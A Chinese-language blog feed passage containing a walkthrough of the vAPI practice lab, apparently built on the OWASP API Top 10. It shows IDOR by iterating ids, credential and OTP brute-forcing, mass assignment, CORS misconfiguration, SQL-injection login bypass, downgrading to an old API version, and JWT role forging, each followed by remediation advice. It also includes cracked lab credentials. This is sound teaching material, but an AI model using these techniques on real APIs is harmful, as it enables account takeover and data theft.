Authorization<br>损坏的对象级授权</p></blockquote><blockquote><p>失效的对象级别授权指未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据（直接的对象引用或限制的URL）。例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p></blockquote><p>简单的API权限校验缺失导致的越权</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323085305383.png" alt="image-20250323085305383"></p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>传入字段值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &quot;123&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;123&quot;,</span><br><span class="line">    &quot;course&quot;: &quot;123&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323085438564.png" alt="image-20250323085438564"></p><p><strong>Get User</strong></p><p>成功获取</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323085834298.png" alt="image-20250323085834298"></p><p><strong>Update User</strong></p><p>传入字段值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;456&quot;,</span><br><span class="line">    &quot;course&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功修改用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323090059655.png" alt="image-20250323090059655"></p><p>再使用GetUser接口检验一下</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323090122815.png" alt="image-20250323090122815"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们发现，当我们CreateUser时，会自动生成一个Authorization-Token请求头，这个值就是一个合法的Token</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323090712842.png" alt="image-20250323090712842"></p><p>当我们将Token删除时，页面返回失败</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323090812681.png" alt="image-20250323090812681"></p><p>当我们将Token值更改时，页面同样返回失败</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323090904599.png" alt="image-20250323090904599"></p><p>说明该接口是根据Token字段来判断是否处于登录状态</p><p>而当我们修改api1_id参数值为6时，返回了其他用户的信息，说明接口只判断了用户名和密码是否匹配，而没有判断id与用户名是否匹配</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323091135289.png" alt="image-20250323091135289"></p><p>因此通过遍历id值可以得到所有用户信息</p><p>id为1时，即得到flag</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323091439876.png" alt="image-20250323091439876"></p><p>同时还可以访问UpdateUser接口进行修改任意用户信息</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞是由于创建CreateUser时生成了Token，在之后进行GetUser和UpdateUser时只检验了Token是否合法，而没有检验Token和id是否匹配，从而导致了越权</p><p><strong>修复建议</strong></p><p>对于进行其他操作时，要通过接收Token对数据库中存储的用户id进行校验</p><h2 id="API2-失效的用户认证"><a href="#API2-失效的用户认证" class="headerlink" title="API2 - 失效的用户认证"></a>API2 - 失效的用户认证</h2><blockquote><p>API 通常不会正确验证用户身份。这个问题基本上围绕认证方面，如弱口令、默认口令、明文存储、弱加密、密码爆破、GET方式传输令牌和密码等。</p></blockquote><h3 id="接口-1"><a href="#接口-1" class="headerlink" title="接口"></a>接口</h3><p><strong>User Login</strong></p><p>需要输入email和password</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323092618328.png" alt="image-20250323092618328"></p><p><strong>Get Detail</strong></p><p>获取用户信息，是通过Token来获取用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323092728406.png" alt="image-20250323092728406"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093135094.png" alt="image-20250323093135094"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093114130.png" alt="image-20250323093114130"></p><p>这是一个邮箱和密码的字典</p><p>尝试postman转发到burp去爆破</p><blockquote><p>postman代理配置</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093401868.png" alt="image-20250323093401868"></p><p>burp代理配置</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093442610.png" alt="image-20250323093442610"></p><p>爆破配置</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093530984.png" alt="image-20250323093530984"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093621317.png" alt="image-20250323093621317"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093629620.png" alt="image-20250323093629620"></p><p>爆破时关闭URL编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323093640117.png" alt="image-20250323093640117"></p></blockquote><p>最后获得的正确的邮箱密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">harber.leif@beatty.info</span><br><span class="line">kU-wDE7r</span><br><span class="line"></span><br><span class="line">hauck.aletha@yahoo.com</span><br><span class="line">kU-wDE7r</span><br><span class="line"></span><br><span class="line">savanna48@ortiz.com</span><br><span class="line">zTyBwV/9</span><br></pre></td></tr></table></figure><p>登录，得到Token</p><p>使用Get Details接口，可以获得所有用户的数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323094807548.png" alt="image-20250323094807548"></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>当我们使用Get Details接口时，未授权成功返回了所有数据，并没有对Token进行校验</p><p><strong>修复建议</strong></p><p>校验Token并且只匹配并返回Token所对应的用户的数据</p><p>添加登陆验证码<br>限制账号、IP登陆次数</p><h2 id="API3-过度的数据暴露"><a href="#API3-过度的数据暴露" class="headerlink" title="API3 - 过度的数据暴露"></a>API3 - 过度的数据暴露</h2><blockquote><p>API 可能会返回大量不必要的数据作为响应，并在客户端对其进行过滤以仅显示所需的数据。攻击者可以通过使用 Burpsuite，并访问响应中返回的过多数据。</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323095116113.png" alt="image-20250323095116113"></p><h3 id="接口-2"><a href="#接口-2" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323100234569.png" alt="image-20250323100234569"></p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>安装资源包中的apk</p><blockquote><p>需要高版本安卓，我这里用安卓7.1无法安装，9.0可以安装</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323100811597.png" alt="image-20250323100811597"></p><p>填写url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.130/vapi</span><br></pre></td></tr></table></figure><p>点击save，填写刚刚注册的用户信息</p><p>观察数据包发现，有一个comment数据包泄露了敏感信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323101142868.png" alt="image-20250323101142868"></p><p>手机前端不会显示暴露的信息，但在数据包中会有显示</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>数据交互时由于配置不当，可能会在一些数据包中泄露了敏感信息</p><h2 id="API4-资源缺失-速率限制"><a href="#API4-资源缺失-速率限制" class="headerlink" title="API4 - 资源缺失 &amp; 速率限制"></a>API4 - 资源缺失 &amp; 速率限制</h2><h3 id="接口-3"><a href="#接口-3" class="headerlink" title="接口"></a>接口</h3><p><strong>Mobile Login</strong></p><p>手机号登录，通过手机号登录，输入手机号，提示已将4位数的OTP发送到手机。</p><blockquote><p>OTP：One Time Password，又称一次性口令、一次性密码、动态密码、单次有效密码。</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323103113873.png" alt="image-20250323103113873"></p><p><strong>Verify OTP</strong></p><p>对传入的4位数字的OTP进行验证</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323103229045.png" alt="image-20250323103229045"></p><p><strong>Get Details</strong></p><p>验证通过，获取用户信息</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>后台没有对访问速率与错误次数进行限制，可暴力破解4位OTP</p><blockquote><p>burp爆破</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323103541627.png" alt="image-20250323103541627"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323103519485.png" alt="image-20250323103519485"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323103913001.png" alt="image-20250323103913001"></p></blockquote><p>爆破成功的key就是Get Details接口的Token值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FZvjaFlMgUfnpFJDhKx-92xeXx_sCr7Y</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323104030017.png" alt="image-20250323104030017"></p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>由于没有对OTP爆破进行限制，导致OTP可爆破</p><p><strong>修复建议</strong></p><ul><li>限制OTP错误次数。</li><li>增强OTP复杂度。</li></ul><h2 id="API5-失效的功能级授权"><a href="#API5-失效的功能级授权" class="headerlink" title="API5 - 失效的功能级授权"></a>API5 - 失效的功能级授权</h2><blockquote><p>有些时候，普通用户可以调整请求的方法，检索到他们不应该检索到的信息，或执行他不应该访问的操作。</p><p>此题参考垂直越权漏洞。</p></blockquote><h3 id="接口-4"><a href="#接口-4" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;address&quot;:&quot;ABC&quot;,</span><br><span class="line">    &quot;mobileno&quot;:&quot;888888888&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323104509736.png" alt="image-20250323104509736"></p><p><strong>Get User</strong></p><p>获取用户</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323104709470.png" alt="image-20250323104709470"></p><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>创建用户之后获取用户，在获取用户的接口处尝试将id改为1，说明进行了Token和id的校验</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323104804492.png" alt="image-20250323104804492"></p><p>而我们访问users接口，可以看到管理员信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323104936382.png" alt="image-20250323104936382"></p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这里虽然对id和Token进行了校验，但是对于Users接口并没有做鉴权，导致普通用户可以访问该接口来查看全部用户信息</p><p><strong>修复建议</strong></p><p>对于users访问时进行鉴权，校验Token，非管理员Token无法访问该接口</p><h2 id="API6-批量分配"><a href="#API6-批量分配" class="headerlink" title="API6 - 批量分配"></a>API6 - 批量分配</h2><blockquote><p>有时候，API 会信任从客户端接收到的用户输入，并在不经过过滤的情况下，将其直接保存在数据库中。为了获得对受限功能的未经授权的访问，攻击者可以通过 API 文档、有根据的猜测或 HTTP 回复识别额外的对象，并将它们包含在请求中。例如，攻击者可能会将 &amp;admin&#x3D;true 参数附加到用户的注册并获得管理员权限。</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323115505366.png" alt="image-20250323115505366"></p><h3 id="接口-5"><a href="#接口-5" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;username&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323115552285.png" alt="image-20250323115552285"></p><p><strong>Get User</strong></p><p>获取用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323115632189.png" alt="image-20250323115632189"></p><h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里创建用户之后，获取用户信息，credit字段值为0，积分为0</p><p>想要获取积分，尝试在创建用户时手动添加积分字段并且赋值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&quot;1234&quot;,</span><br><span class="line">    &quot;username&quot;:&quot;1234&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;1234&quot;,</span><br><span class="line">    &quot;credit&quot;:&quot;1000&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323120141338.png" alt="image-20250323120141338"></p><p>在点击Get User接口查看用户信息，发现积分成功被添加上，同时得到flag</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323120227484.png" alt="image-20250323120227484"></p><blockquote><p>这里如果刚开始创建的没有积分字段的用户123，而再次创建一个添加积分字段的123，如果这两个用户的用户名和密码都相同时，不会在新创建的用户信息中看到添加成功积分，因为这里的Token是基于用户名和密码来生成的，而创建两个用户名和密码都相同的用户，他们生成的Token也一致，虽然的确是两个不同的用户id，此时基于Token查看新创建的用户信息，查到的仍然是之前创建的那个用户123的信息，因此并没有成功添加积分字段</p><p>因此，Token严格来说应该基于用户id和用户名密码来生成</p></blockquote><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>在创建用户时，我们可以基于查看用户信息所返回的字段来尝试手动添加相应字段</p><h2 id="API7-安全性配置不当"><a href="#API7-安全性配置不当" class="headerlink" title="API7 - 安全性配置不当"></a>API7 - 安全性配置不当</h2><blockquote><p>安全配置不当包括默认或不完整的配置、配置不当的HTTP头、不必要的HTTP请求方法、跨源资源共享(CORS)配置不当、以及包含敏感数据的详细的报错消息等问题。攻击者可能会利用这些不当的配置来获得未经授权访问或破坏安全机制。</p></blockquote><p>此题涉及CORS配置不当</p><blockquote><p>跨域资源共享（CORS）是一种浏览器机制，可实现对位于给定域外部的资源的受控访问。它扩展了同源策略（SOP）并增加了灵活性。但是，如果网站的CORS策略配置和实施不当，它也可能带来用户敏感数据被窃取、基于跨域的攻击等风险。</p></blockquote><blockquote><p>关于CORS漏洞<a href="https://blog.csdn.net/weixin_46622976/article/details/128452494">https://blog.csdn.net/weixin_46622976/article/details/128452494</a></p></blockquote><h3 id="接口-6"><a href="#接口-6" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;123&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121338004.png" alt="image-20250323121338004"></p><p><strong>User Login</strong></p><p>用户登录</p><p>根据Token来校验登录</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121437874.png" alt="image-20250323121437874"></p><p>并且生成Cookie</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121548285.png" alt="image-20250323121548285"></p><p><strong>Get Key</strong></p><p>获取密钥</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121601483.png" alt="image-20250323121601483"></p><p>这个接口只能够在登录后使用</p><p>未登录时使用：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121732178.png" alt="image-20250323121732178"></p><p><strong>User Logout</strong></p><p>用户退出</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323121616962.png" alt="image-20250323121616962"></p><h3 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞就在获取密钥的接口处</p><p>在登录状态后的获取密钥的接口，请求时添加请求头Origin，值可以为任意，仍然可以得到正确的响应，说明存在CORS漏洞</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323122014381.png" alt="image-20250323122014381"></p><p>同时响应头</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323122130377.png" alt="image-20250323122130377"></p><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>这里涉及到CORS的防御</p><ol><li>Access-Control-Allow-Origin中指定的来源只能是受信任的站点，避免使用Access-Control-Allow-Origin: *，避免使用Access-Control-Allow-Origin: null，否则攻击者可以伪造来源请求实现跨域资源窃取。</li><li>严格校验“Origin”值，校验的正则表达式一定要编写完善，避免出现绕过的情况。</li><li>减少“Access-Control-Allow-Methods”所允许的请求方法。</li><li>除了正确配置CORS之外，Web服务器还应继续对敏感数据进行保护，例如身份验证和会话管理等</li></ol><h2 id="API8-注入"><a href="#API8-注入" class="headerlink" title="API8 - 注入"></a>API8 - 注入</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323123952913.png" alt="image-20250323123952913"></p><h3 id="接口-7"><a href="#接口-7" class="headerlink" title="接口"></a>接口</h3><p><strong>User Login</strong></p><p>没有创建用户了，直接用户登录</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323122816708.png" alt="image-20250323122816708"></p><p><strong>Get Secret</strong></p><p>获取用户登录后的信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323123233535.png" alt="image-20250323123233535"></p><h3 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于没有注册页面，只有登录页面，尝试注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323122943330.png" alt="image-20250323122943330"></p><p>这里输入单引号就报错了，是存在注入的，由于我们是想尝试登陆来获取用户信息，尝试万能密码登录</p><p>成功登录，拿到Token</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323123350875.png" alt="image-20250323123350875"></p><p>成功获取用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323123423020.png" alt="image-20250323123423020"></p><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>这里的注入和平常的注入相同，防御思路也和SQL注入防御思路相同</p><ol><li>过滤</li><li>预编译</li><li>最小权限</li><li>统一报错信息</li></ol><h2 id="API9-资产管理不当"><a href="#API9-资产管理不当" class="headerlink" title="API9 - 资产管理不当"></a>API9 - 资产管理不当</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323123837850.png" alt="image-20250323123837850"></p><blockquote><p>在这种情况下，处理所有请求和响应的资产没有得到正确处理。例如，当新的更新进入市场时，开发人员将 API 更新为 v3，但忘记禁用 API v2。现在，如果某些攻击者将 URL 中的 v3 的值更改为 v2。他可以利用 v2 版本中存在的漏洞。</p><p>而这里的刚刚推出v2，说明v2为新版本，v1为旧版本</p></blockquote><h3 id="接口-8"><a href="#接口-8" class="headerlink" title="接口"></a>接口</h3><p><strong>Login</strong></p><p>这里v2的Login，参数pin的值是模糊的</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323124030650.png" alt="image-20250323124030650"></p><h3 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>尝试对pin值进行爆破</p><blockquote><p>一般来说，pin值都是四位纯数字</p></blockquote><p>但是v2版本有防爆破机制，请求过多时就会响应500</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323124450123.png" alt="image-20250323124450123"></p><p>更换为v1再进行尝试爆破</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323124602681.png" alt="image-20250323124602681"></p><p>全是200，没有防爆破机制，可以爆破</p><p>成功爆破</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323125022586.png" alt="image-20250323125022586"></p><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>在实际生产环境中，如果遇到url中存在版本信息时，可以尝试对版本信息进行相应切换，有时候低版本的更容易进行渗透</p><blockquote><p>这只是一种尝试思路，高版本和低版本可能会存在路径不同或者其他问题</p></blockquote><p><strong>修复建议</strong></p><p>停用老版本API</p><h2 id="API10-日志和监控不足"><a href="#API10-日志和监控不足" class="headerlink" title="API10 - 日志和监控不足"></a>API10 - 日志和监控不足</h2><blockquote><p>这一关直接访问就可以获得flag</p></blockquote><p>大多数 API 未配置用于监视、记录或发出警告，从而允许攻击者长时间不被发现，允许他在系统中保持持久性，执行横向移动，以及危及重要系统。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323125315085.png" alt="image-20250323125315085"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323125454226.png" alt="image-20250323125454226"></p><p><strong>修复建议</strong></p><p>对API做日志管理和访问监控</p><h2 id="JustWeakToken-JWT认证"><a href="#JustWeakToken-JWT认证" class="headerlink" title="JustWeakToken - JWT认证"></a>JustWeakToken - JWT认证</h2><blockquote><p>可能是新版的vapi，多了几个题目，这里只写了第一个，后两个暂时还没有思路</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131221342.png" alt="image-20250323131221342"></p><h3 id="接口-9"><a href="#接口-9" class="headerlink" title="接口"></a>接口</h3><p><strong>Create User</strong></p><p>创建用户</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131338322.png" alt="image-20250323131338322"></p><p><strong>Get User</strong></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131355282.png" alt="image-20250323131355282"></p><h3 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>创建用户时生成了jwt token，对token进行jwt解码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131543704.png" alt="image-20250323131543704"></p><p>role为user，尝试更改为admin看是否存在越权</p><p>重新编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131614865.png" alt="image-20250323131614865"></p><p>替换token并发送</p><p>成功利用</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250323131653408.png" alt="image-20250323131653408"></p><h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3><p>在遇到jwt加密时可以尝试解码并修改一些参数的值 尝试越权</p><h1 id="靶场总结"><a href="#靶场总结" class="headerlink" title="靶场总结"></a>靶场总结</h1><p>对于API渗透测试，大多数都是来测逻辑漏洞，更改其中的参数值来尝试越权、敏感信息泄露等，见名知意，根据接口字段名称去猜测接口功能，并有针对性的去进行渗透测试</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API安全 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API安全</title>
      <link href="/2025/05/27/API%E5%AE%89%E5%85%A8/"/>
      <url>/2025/05/27/API%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0d20ee66a9ed86887952dc2ff016cc51.jpeg" alt="img"></p><p>智能家居:手机app发送数据给服务器，服务器通过api下达指令给设备</p><h1 id="API分类特征"><a href="#API分类特征" class="headerlink" title="API分类特征"></a>API分类特征</h1><p>SOAP - WSDL<br>OpenApi - Swagger<br>RESTful - &#x2F;v1&#x2F;api&#x2F;</p><p>添加wsdl参数可以看到全部的api接口地址和参数信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250310215103693.png" alt="image-20250310215103693"></p><p>后缀为asmx</p><p>小众接口：自己开发调用<br>官方接口：微信等其他厂商开发，开发者调用</p><p>结合网站功能看</p><h1 id="API常见漏洞"><a href="#API常见漏洞" class="headerlink" title="API常见漏洞"></a>API常见漏洞</h1><p>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用、逻辑越权等</p><h1 id="API检测流程"><a href="#API检测流程" class="headerlink" title="API检测流程"></a>API检测流程</h1><p>Method：请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等</p><p>URL：唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等</p><p>Params：请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等</p><p>Authorization：认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等</p><p>Headers：请求消息头<br>攻击方式：拦截数据包，改Hosts，改Referer，改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等</p><p>Body：消息体<br>攻击方式：SQL注入，XML注入，反序列化等</p><h1 id="SOAP-WSDL"><a href="#SOAP-WSDL" class="headerlink" title="SOAP - WSDL"></a>SOAP - WSDL</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250310215008694.png" alt="image-20250310215008694"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250310215132403.png" alt="image-20250310215132403"></p><h2 id="Postman-联动burp-xray"><a href="#Postman-联动burp-xray" class="headerlink" title="Postman 联动burp+xray"></a>Postman 联动burp+xray</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/6817a63f3925e57eaa58987e3f4d3e6d.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0cb31301375e21c87058f27fc8055fa1.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3b18eed65c7ae83b7b0bae5162c9b4b3.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/034bf5124f7046d6369deafc76fcd73d.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/c80d88b1d5e007331df1f1885afe69d6.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/bfc03b00f0c1722137ef876b8ecc2068.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/15daf3dc75e74b5c4158fa968d45342d.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d71adac39861267a0f8df4d6e96e9698.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/104ae70303dda79b363addf65fff563c.png" alt="img"></p><p>在运行之前需要在postman开启代理</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/70e3ef9dc98a4ed5c8d746f7786aa6e7.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/757bba7213a48fd567c88320e2cc3d04.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/35d6300278896751a3838453a5d6b5ee.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/cd73e5537942d2557d91fae9f3123a03.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/8e6538a6978f5f6b9bf107505de78bae.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/cd0385c18b4127c84c3e7c1ebb8d2b69.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/7ec5cdd56243f0eaad72ef6de87384d7.png" alt="img"></p><h2 id="APIKit插件-可联动xray"><a href="#APIKit插件-可联动xray" class="headerlink" title="APIKit插件(可联动xray)"></a>APIKit插件(可联动xray)</h2><p><img 